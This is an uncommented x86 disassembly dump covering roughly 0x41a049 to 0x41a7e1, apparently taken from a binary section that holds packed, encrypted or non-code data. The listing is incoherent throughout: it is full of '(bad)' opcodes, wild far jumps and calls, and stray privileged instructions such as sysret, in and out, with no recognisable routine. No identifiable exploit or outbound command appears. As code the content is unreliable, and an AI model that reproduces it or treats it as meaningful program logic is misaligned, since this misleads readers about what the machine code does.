  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
